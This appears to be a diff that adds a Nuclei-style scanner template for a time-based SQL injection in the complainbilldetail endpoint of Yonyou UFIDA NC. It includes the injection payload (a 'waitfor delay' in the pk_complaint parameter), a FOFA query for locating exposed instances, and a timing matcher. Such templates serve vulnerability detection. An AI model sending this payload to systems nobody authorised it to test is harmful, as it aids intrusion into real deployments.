@@ -1,0 +1,29 @@
+id: yonyou-UFIDA-NC-complainbilldetail-sqli
+
+info:
+  name: 用友NC complainbilldetail SQL注入漏洞
+  author: xx
+  severity: high
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,sqli
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /ebvp/advorappcoll/complainbilldetail?pageId=login&pk_complaint=1'waitfor+delay+'0:0:4'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+
+
+  matchers-condition: and
+  matchers:
+        - type: dsl
+          dsl:
+            - 'duration>=4 && duration<6'
+          condition: and
